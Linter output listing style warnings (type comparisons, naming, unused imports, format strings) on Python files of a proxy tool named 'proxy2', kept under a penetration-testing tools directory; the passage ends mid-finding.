482 |                 elif type(v) == list or type(v) == tuple:
    |                                         ^^^^^^^^^^^^^^^^
483 |                     self.determinants[k] = v
484 |                 elif type(v) == type(None):
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:484:22
    |
482 |                 elif type(v) == list or type(v) == tuple:
483 |                     self.determinants[k] = v
484 |                 elif type(v) == type(None):
    |                      ^^^^^^^^^^^^^^^^^^^^^
485 |                     self.determinants[k] = []
486 |                 else:
    |

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:492:51
    |
491 |                 for i in range(len(self.determinants[k])):
492 |                     if self.determinants[k][i] == None:
    |                                                   ^^^^
493 |                         self.determinants[k][i] = ""
    |
help: Replace with `cond is None`

N803 Argument name `ipLookupResult` should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:495:25
    |
493 |                         self.determinants[k][i] = ""
494 |
495 |     def determine(self, ipLookupResult):
    |                         ^^^^^^^^^^^^^^
496 |         if type(ipLookupResult) != dict or len(ipLookupResult) == 0:
497 |             self.logger.err(
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:496:12
    |
495 |     def determine(self, ipLookupResult):
496 |         if type(ipLookupResult) != dict or len(ipLookupResult) == 0:
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
497 |             self.logger.err(
498 |                 f"Given IP geolocation results object was either empty or not a dictionary: {ipLookupResult}"
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:509:16
    |
507 |                 continue
508 |
509 |             if determinant in ipLookupResult.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
510 |                 checked += 1
511 |                 matched = False
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:515:20
    |
513 |                 results = []
514 |
515 |                 if type(ipLookupResult[determinant]) == str:
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
516 |                     results.append(ipLookupResult[determinant])
517 |                 else:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:554:12
    |
552 |         values = []
553 |
554 |         if type(v) == str:
    |            ^^^^^^^^^^^^^^
555 |             if " " in v:
556 |                 values.extend(v.split(" "))
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:558:14
    |
556 |                 values.extend(v.split(" "))
557 |             values.append(v)
558 |         elif type(v) == int or type(v) == float:
    |              ^^^^^^^^^^^^^^
559 |             values.extend([str(v)])
560 |         elif type(v) == tuple or type(v) == list:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:558:32
    |
556 |                 values.extend(v.split(" "))
557 |             values.append(v)
558 |         elif type(v) == int or type(v) == float:
    |                                ^^^^^^^^^^^^^^^^
559 |             values.extend([str(v)])
560 |         elif type(v) == tuple or type(v) == list:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:560:14
    |
558 |         elif type(v) == int or type(v) == float:
559 |             values.extend([str(v)])
560 |         elif type(v) == tuple or type(v) == list:
    |              ^^^^^^^^^^^^^^^^
561 |             for w in v:
562 |                 values.extend(IPGeolocationDeterminant.getValues(w, n + 1))
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:560:34
    |
558 |         elif type(v) == int or type(v) == float:
559 |             values.extend([str(v)])
560 |         elif type(v) == tuple or type(v) == list:
    |                                  ^^^^^^^^^^^^^^^
561 |             for w in v:
562 |                 values.extend(IPGeolocationDeterminant.getValues(w, n + 1))
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:563:14
    |
561 |             for w in v:
562 |                 values.extend(IPGeolocationDeterminant.getValues(w, n + 1))
563 |         elif type(v) == dict and n < 10:
    |              ^^^^^^^^^^^^^^^
564 |             values.extend(IPGeolocationDeterminant.getValuesDict(v, n + 1))
    |

B007 Loop control variable `k` not used within loop body
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:572:13
    |
570 |         values = []
571 |
572 |         for k, v in data.items():
    |             ^
573 |             if type(v) == dict and n < 10:
574 |                 values.extend(IPGeolocationDeterminant.getValuesDict(v, n + 1))
    |
help: Rename unused `k` to `_k`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:573:16
    |
572 |         for k, v in data.items():
573 |             if type(v) == dict and n < 10:
    |                ^^^^^^^^^^^^^^^
574 |                 values.extend(IPGeolocationDeterminant.getValuesDict(v, n + 1))
575 |             elif n < 10:
    |

N803 Argument name `ipLookupDetails` should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:581:15
    |
580 |     def validateIpGeoMetadata(
581 |         self, ipLookupDetails, bannedAgents, overrideBannedAgents=[]
    |               ^^^^^^^^^^^^^^^
582 |     ):
583 |         if len(ipLookupDetails) == 0:
    |

N803 Argument name `bannedAgents` should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:581:32
    |
580 |     def validateIpGeoMetadata(
581 |         self, ipLookupDetails, bannedAgents, overrideBannedAgents=[]
    |                                ^^^^^^^^^^^^
582 |     ):
583 |         if len(ipLookupDetails) == 0:
    |

N803 Argument name `overrideBannedAgents` should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:581:46
    |
580 |     def validateIpGeoMetadata(
581 |         self, ipLookupDetails, bannedAgents, overrideBannedAgents=[]
    |                                              ^^^^^^^^^^^^^^^^^^^^^^^
582 |     ):
583 |         if len(ipLookupDetails) == 0:
    |

B006 Do not use mutable data structures for argument defaults
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:581:67
    |
580 |     def validateIpGeoMetadata(
581 |         self, ipLookupDetails, bannedAgents, overrideBannedAgents=[]
    |                                                                   ^^
582 |     ):
583 |         if len(ipLookupDetails) == 0:
    |
help: Replace with `None`; initialize within function

C414 Unnecessary `list()` call within `set()`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:586:17
    |
584 |               return (True, "")
585 |
586 |           words = set(
    |  _________________^
587 | |             list(filter(None, IPGeolocationDeterminant.getValuesDict(ipLookupDetails)))
588 | |         )
    | |_________^
589 |           if len(words) == 0:
590 |               return (True, "")
    |
help: Remove the inner `list()` call

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:639:25
    |
637 |                         return (False, w)
638 |
639 |         self.logger.dbg(f"Peer's IP Geolocation metadata didn't raise any suspicion.")
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
640 |         return (True, "")
    |
help: Remove extraneous `f` prefix

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\proxy2\lib\ipLookupHelper.py:683:13
    |
681 |             try:
682 |                 config = yaml.load(f, Loader=yaml.FullLoader)
683 |             except:
    |             ^^^^^^
684 |                 config = yaml.load(f)
    |

C416 Unnecessary list comprehension (rewrite using `list()`)
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:229:13
    |
227 |       if opts["list_plugins"]:
228 |           files = sorted(
229 | /             [
230 | |                 f
231 | |                 for f in os.scandir(
232 | |                     os.path.join(
233 | |                         os.path.dirname(os.path.realpath(__file__)), "../plugins/"
234 | |                     )
235 | |                 )
236 | |             ],
    | |_____________^
237 |               key=lambda f: f.name,
238 |           )
    |
help: Rewrite using `list()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:245:23
    |
243 |                 and entry.name.lower() not in ["iproxyplugin.py", "__init__.py"]
244 |             ):
245 |                 print("[+] Plugin: {}".format(entry.name))
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
246 |
247 |         sys.exit(0)
    |
help: Convert to f-string

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:249:26
    |
247 |         sys.exit(0)
248 |
249 |     if opts["plugin"] != None and len(opts["plugin"]) > 0:
    |                          ^^^^
250 |         for i, opt in enumerate(opts["plugin"]):
251 |             decomposed = PluginsLoader.decompose_path(opt)
    |
help: Replace with `cond is not None`

B007 Loop control variable `i` not used within loop body
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:250:13
    |
249 |     if opts["plugin"] != None and len(opts["plugin"]) > 0:
250 |         for i, opt in enumerate(opts["plugin"]):
    |             ^
251 |             decomposed = PluginsLoader.decompose_path(opt)
252 |             if not os.path.isfile(decomposed["path"]):
    |
help: Rename unused `i` to `_i`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:257:25
    |
255 |                     os.path.join(
256 |                         os.path.dirname(os.path.realpath(__file__)),
257 |                         "../plugins/{}.py".format(opt),
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
258 |                     )
259 |                 )
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:262:25
    |
260 |                 if not os.path.isfile(opt2):
261 |                     raise Exception(
262 |                         'Specified plugin: "%s" does not exist.' % decomposed["path"]
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
263 |                     )
264 |                 else:
    |
help: Replace with format specifiers

F841 Local variable `f` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:277:48
    |
275 |         try:
276 |             if not os.path.isfile(opts["log"]):
277 |                 with open(opts["log"], "w") as f:
    |                                                ^
278 |                     pass
279 |             opts["log"] = opts["log"]
    |
help: Remove assignment to unused variable `f`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:282:13
    |
281 |           except Exception as e:
282 | /             raise Exception(
283 | |                 '[ERROR] Failed to open log file for writing. Error: "%s"' % e
284 | |             )
    | |_____________^
285 |       else:
286 |           opts["log"] = sys.stdout
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:283:17
    |
281 |         except Exception as e:
282 |             raise Exception(
283 |                 '[ERROR] Failed to open log file for writing. Error: "%s"' % e
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
284 |             )
285 |     else:
    |
help: Replace with format specifiers

N806 Variable `parametersRequiringDirectPath` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:299:5
    |
298 | def parseParametersFromConfigFile(_params):
299 |     parametersRequiringDirectPath = (
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
300 |         "log",
301 |         "output",
    |

N806 Variable `translateParamNames` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:313:5
    |
311 |     )
312 |
313 |     translateParamNames = {
    |     ^^^^^^^^^^^^^^^^^^^
314 |         "output": "log",
315 |         "proxy_url": "proxy_self_url",
    |

N806 Variable `valuesThatNeedsToBeList` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:325:5
    |
323 |     }
324 |
325 |     valuesThatNeedsToBeList = (
    |     ^^^^^^^^^^^^^^^^^^^^^^^
326 |         "port",
327 |         "plugin",
    |

N806 Variable `configBasePath` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:332:5
    |
330 |     outparams = vars(_params)
331 |     config = {}
332 |     configBasePath = ""
    |     ^^^^^^^^^^^^^^
333 |
334 |     if outparams["config"] != None and len(outparams["config"]) > 0:
    |

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:334:31
    |
332 |     configBasePath = ""
333 |
334 |     if outparams["config"] != None and len(outparams["config"]) > 0:
    |                               ^^^^
335 |         if not "config" in outparams.keys() or not os.path.isfile(outparams["config"]):
336 |             raise Exception(
    |
help: Replace with `cond is not None`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:335:16
    |
334 |     if outparams["config"] != None and len(outparams["config"]) > 0:
335 |         if not "config" in outparams.keys() or not os.path.isfile(outparams["config"]):
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
336 |             raise Exception(
337 |                 f'proxy2 config file not found: ({outparams["config"]}) or --config not specified!'
    |
help: Remove `.keys()`

E713 [*] Test for membership should be `not in`
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:335:16
    |
334 |     if outparams["config"] != None and len(outparams["config"]) > 0:
335 |         if not "config" in outparams.keys() or not os.path.isfile(outparams["config"]):
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
336 |             raise Exception(
337 |                 f'proxy2 config file not found: ({outparams["config"]}) or --config not specified!'
    |
help: Convert to `not in`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:346:13
    |
344 |             try:
345 |                 config = yaml.load(f, Loader=yaml.FullLoader)
346 |             except:
    |             ^^^^^^
347 |                 config = yaml.load(f)
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:352:16
    |
351 |         for val in valuesThatNeedsToBeList:
352 |             if val in outparams.keys() and val in config.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^
353 |                 if type(config[val]) == str:
354 |                     outparams[val] = [
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:352:44
    |
351 |         for val in valuesThatNeedsToBeList:
352 |             if val in outparams.keys() and val in config.keys():
    |                                            ^^^^^^^^^^^^^^^^^^^^
353 |                 if type(config[val]) == str:
354 |                     outparams[val] = [
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:353:20
    |
351 |         for val in valuesThatNeedsToBeList:
352 |             if val in outparams.keys() and val in config.keys():
353 |                 if type(config[val]) == str:
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^
354 |                     outparams[val] = [
355 |                         config[val],
    |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:361:16
    |
360 |         for k, v in ProxyOptionsDefaultValues.items():
361 |             if k not in outparams.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^
362 |                 outparams[k] = v
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:365:16
    |
364 |         for k, v in translateParamNames.items():
365 |             if k in outparams.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^
366 |                 outparams[v] = outparams[k]
367 |             if v in outparams.keys():
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:367:16
    |
365 |             if k in outparams.keys():
366 |                 outparams[v] = outparams[k]
367 |             if v in outparams.keys():
    |                ^^^^^^^^^^^^^^^^^^^^^
368 |                 outparams[k] = outparams[v]
    |
help: Remove `.keys()`

N806 Variable `configBasePath` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:370:9
    |
368 |                 outparams[k] = outparams[v]
369 |
370 |         configBasePath = os.path.dirname(os.path.abspath(outparams["config"]))
    |         ^^^^^^^^^^^^^^
371 |
372 |         for paramName in parametersRequiringDirectPath:
    |

N806 Variable `paramName` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:372:13
    |
370 |         configBasePath = os.path.dirname(os.path.abspath(outparams["config"]))
371 |
372 |         for paramName in parametersRequiringDirectPath:
    |             ^^^^^^^^^
373 |             if (
374 |                 paramName in outparams.keys()
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:374:17
    |
372 |         for paramName in parametersRequiringDirectPath:
373 |             if (
374 |                 paramName in outparams.keys()
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
375 |                 and outparams[paramName] != ""
376 |                 and outparams[paramName] != None
    |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:376:45
    |
374 |                 paramName in outparams.keys()
375 |                 and outparams[paramName] != ""
376 |                 and outparams[paramName] != None
    |                                             ^^^^
377 |             ):
378 |                 outparams[paramName] = os.path.join(
    |
help: Replace with `cond is not None`

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:384:33
    |
382 |         return outparams
383 |
384 |     except FileNotFoundError as e:
    |                                 ^
385 |         raise Exception(f'proxy2 config file not found: ({outparams["config"]})!')
    |
help: Remove assignment to unused variable `e`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:385:9
    |
384 |     except FileNotFoundError as e:
385 |         raise Exception(f'proxy2 config file not found: ({outparams["config"]})!')
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
386 |
387 |     except Exception as e:
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:388:9
    |
387 |       except Exception as e:
388 | /         raise Exception(
389 | |             f"Unhandled exception occured while parsing proxy2 config file: {e}"
390 | |         )
    | |_________^
391 |
392 |       return outparams
    |

C416 Unnecessary list comprehension (rewrite using `list()`)
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:399:9
    |
397 |       plugins = []
398 |       files = sorted(
399 | /         [
400 | |             f
401 | |             for f in os.scandir(
402 | |                 os.path.join(os.path.dirname(os.path.realpath(__file__)), "../plugins/")
403 | |             )
404 | |         ],
    | |_________^
405 |           key=lambda f: f.name,
406 |       )
    |
help: Rewrite using `list()`

F841 Local variable `plugin_own_options` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:420:5
    |
418 |     options["debug"] = False
419 |
420 |     plugin_own_options = {}
    |     ^^^^^^^^^^^^^^^^^^
421 |
422 |     pl = PluginsLoader(logger, options)
    |
help: Remove assignment to unused variable `plugin_own_options`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:424:20
    |
422 |     pl = PluginsLoader(logger, options)
423 |     for name, plugin in pl.get_plugins().items():
424 |         logger.dbg("Fetching plugin {} options.".format(name))
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
425 |         if hasattr(plugin, "help"):
426 |             plugin_options = parser.add_argument_group(
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\optionsparser.py:427:17
    |
425 |         if hasattr(plugin, "help"):
426 |             plugin_options = parser.add_argument_group(
427 |                 "Plugin '{}' options".format(plugin.get_name())
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
428 |             )
429 |             plugin.help(plugin_options)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\web\proxy2\lib\pluginsloader.py:21:20
   |
20 |         def _text(self, txt):
21 |             return "[{}] {}".format(self.name, txt)
   |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
22 |
23 |         # Info shall be used as an ordinary logging facility, for every desired output.
   |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\web\proxy2\lib\pluginsloader.py:51:17
   |
49 |         if plugins_count > 0:
50 |             self.logger.info(
51 |                 "Loading %d plugin%s..."
   |                 ^^^^^^^^^^^^^^^^^^^^^^^^
52 |                 % (plugins_count, "" if plugins_count == 1 else "s")
53 |             )
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\web\proxy2\lib\pluginsloader.py:97:25
   |
95 |         instance = None
96 |
97 |         self.logger.dbg('Plugin string: "%s"' % path)
   |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
98 |         decomposed = PluginsLoader.decompose_path(path)
99 |         self.logger.dbg("Decomposed as: %s" % str(decomposed))
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\pluginsloader.py:99:25
    |
 97 |         self.logger.dbg('Plugin string: "%s"' % path)
 98 |         decomposed = PluginsLoader.decompose_path(path)
 99 |         self.logger.dbg("Decomposed as: %s" % str(decomposed))
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
100 |
101 |         plugin = decomposed["path"].strip()
    |
help: Replace with format specifiers

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\pluginsloader.py:105:57
    |
103 |         if not os.path.isfile(plugin):
104 |             _plugin = os.path.normpath(
105 |                 os.path.join(os.path.dirname(__file__), "../plugins/{}".format(plugin))
    |                                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
106 |             )
107 |             if os.path.isfile(_plugin):
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\pluginsloader.py:118:25
    |
116 |             return
117 |
118 |         self.logger.dbg('Attempting to load plugin: %s ("%s")...' % (name, plugin))
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
119 |
120 |         try:
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\pluginsloader.py:144:33
    |
142 |                     instance = handler
143 |
144 |                 self.logger.dbg('Found class "%s".' % self.options["plugin_class_name"])
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
145 |
146 |             except AttributeError as e:
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\pluginsloader.py:148:21
    |
146 |               except AttributeError as e:
147 |                   self.logger.err(
148 | /                     'Plugin "%s" loading has failed: "%s".'
149 | |                     % (name, self.options["plugin_class_name"])
    | |_______________________________________________________________^
150 |                   )
151 |                   self.logger.err("\tError: %s" % e)
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\pluginsloader.py:151:33
    |
149 |                     % (name, self.options["plugin_class_name"])
150 |                 )
151 |                 self.logger.err("\tError: %s" % e)
    |                                 ^^^^^^^^^^^^^^^^^
152 |                 if self.options["debug"]:
153 |                     raise
    |
help: Replace with format specifiers

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\lib\pluginsloader.py:155:33
    |
153 |                     raise
154 |
155 |             except TypeError as e:
    |                                 ^
156 |                 self.logger.err(
157 |                     'Plugin "{}" instantiation failed due to interface incompatibility.'.format(
    |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\pluginsloader.py:157:21
    |
155 |               except TypeError as e:
156 |                   self.logger.err(
157 | /                     'Plugin "{}" instantiation failed due to interface incompatibility.'.format(
158 | |                         name
159 | |                     )
    | |_____________________^
160 |                   )
161 |                   raise
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\pluginsloader.py:164:33
    |
163 |             if not instance:
164 |                 self.logger.err('Didn\'t find supported class in module "%s"' % name)
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
165 |             else:
166 |                 self.plugins[name] = instance
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\pluginsloader.py:167:34
    |
165 |             else:
166 |                 self.plugins[name] = instance
167 |                 self.logger.info('Plugin "%s" has been installed.' % name)
    |                                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
168 |
169 |         except ImportError as e:
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\pluginsloader.py:171:17
    |
169 |         except ImportError as e:
170 |             self.logger.err(
171 |                 'Couldn\'t load specified plugin: "%s". Error: %s' % (plugin, e)
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
172 |             )
173 |             if self.options["debug"]:
    |
help: Replace with format specifiers

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:2:1
  |
1 | #!/usr/bin/python3
2 | # -*- coding: utf-8 -*-
  | ^^^^^^^^^^^^^^^^^^^^^^^
3 | #
  |
help: Remove unnecessary coding comment

F401 [*] `threading` imported but unused
  --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:17:8
   |
15 | import string
16 | import sys
17 | import threading
   |        ^^^^^^^^^
18 | import time
19 | import traceback
   |
help: Remove unused import: `threading`

F401 [*] `traceback` imported but unused
  --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:19:8
   |
17 | import threading
18 | import time
19 | import traceback
   |        ^^^^^^^^^
20 | import zlib
21 | from datetime import datetime
   |
help: Remove unused import: `traceback`

F401 [*] `html.parser.HTMLParser` imported but unused
  --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:22:25
   |
20 | import zlib
21 | from datetime import datetime
22 | from html.parser import HTMLParser
   |                         ^^^^^^^^^^
23 | from http.server import BaseHTTPRequestHandler
24 | from io import BytesIO, StringIO
   |
help: Remove unused import: `html.parser.HTMLParser`

F401 [*] `http.server.BaseHTTPRequestHandler` imported but unused
  --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:23:25
   |
21 | from datetime import datetime
22 | from html.parser import HTMLParser
23 | from http.server import BaseHTTPRequestHandler
   |                         ^^^^^^^^^^^^^^^^^^^^^^
24 | from io import BytesIO, StringIO
25 | from subprocess import PIPE, Popen
   |
help: Remove unused import: `http.server.BaseHTTPRequestHandler`

F401 [*] `io.StringIO` imported but unused
  --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:24:25
   |
22 | from html.parser import HTMLParser
23 | from http.server import BaseHTTPRequestHandler
24 | from io import BytesIO, StringIO
   |                         ^^^^^^^^
25 | from subprocess import PIPE, Popen
26 | from urllib.parse import parse_qsl, urlparse
   |
help: Remove unused import: `io.StringIO`

F403 `from lib.utils import *` used; unable to detect undefined names
  --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:39:1
   |
37 | from lib.proxylogger import ProxyLogger
38 | from lib.sslintercept import SSLInterception
39 | from lib.utils import *
   | ^^^^^^^^^^^^^^^^^^^^^^^
40 |
41 | urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
   |

F405 `plugins` may be undefined, or defined from star imports
  --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:59:32
   |
57 |     def transform_first_chunk(self, status_code, headers, chunk, finishing):
58 |         xhdrs = [
59 |             x.lower() for x in plugins.IProxyPlugin.proxy2_metadata_headers.values()
   |                                ^^^^^^^
60 |         ]
   |

B007 Loop control variable `v` not used within loop body
  --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:62:16
   |
60 |         ]
61 |
62 |         for k, v in headers.items():
   |                ^
63 |             if k.lower() in xhdrs:
64 |                 headers.pop(k)
   |
help: Rename unused `v` to `_v`

B007 Loop control variable `name` not used within loop body
  --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:88:13
   |
86 |         self.server_address, self.all_server_addresses = ProxyRequestHandler.get_ip()
87 |
88 |         for name, plugin in self.plugins.items():
   |             ^^^^
89 |             plugin.logger = logger
   |
help: Rename unused `name` to `_name`

SIM118 Use `key in dict` instead of `key in dict.keys()`
  --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:98:12
   |
97 |     def set_default_headers(self):
98 |         if "Server" in self._headers.keys():
   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
99 |             self.set_header("Server", "nginx")
   |
help: Remove `.keys()`

N806 Variable `IP` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:118:13
    |
116 |             # doesn't even have to be reachable
117 |             s.connect(("10.255.255.255", 1))
